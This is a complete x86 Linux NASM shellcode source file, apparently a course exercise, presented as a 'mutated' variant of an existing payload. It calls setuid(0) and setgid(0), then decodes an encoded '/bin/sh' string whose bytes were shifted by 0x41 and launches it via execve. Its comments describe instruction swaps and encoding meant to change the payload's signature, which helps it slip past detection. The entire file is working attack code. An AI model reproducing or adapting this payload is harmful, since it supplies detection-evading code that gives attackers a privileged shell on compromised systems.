; File: shellcode_2_setuid_gid_sh_mutated.nasm
; Author: Petr Javorik

global _start

section .text

_start:

        jmp short getdata

interrupt:              ; added calls to interrupt

        int 0x80        
        ret

run:

        xor esi, esi    ; change zeroing eax method
        mul esi         ; change zeroing eax method
        mov ecx, edx    ; changed mov ecx, edx place 
        mov al, 0x17
        mov ebx, esi    ; changed instruction to zero ebx
        int 0x80

        mul esi         ; change zeroing eax method
        mov ebx, eax    ; change place and zeroing instruction
        mov al, 0x2e
        call interrupt

        pop ebx         ; changed pop ebx place
        mul esi         ; change zeroing eax method
        mov al, 0xb
        mov edi, ebx
loop:
        sub byte [edi], 0x41    ; sub 0x41 from every data byte
        jz break
        inc edi
        jmp short loop
break:
        jmp short interrupt

getdata:

        call run
        data db 0x70, 0xA3, 0xAA, 0xAF, 0x70, 0xB4, 0xA9, 0x41  ; add 0x41 to every data byte
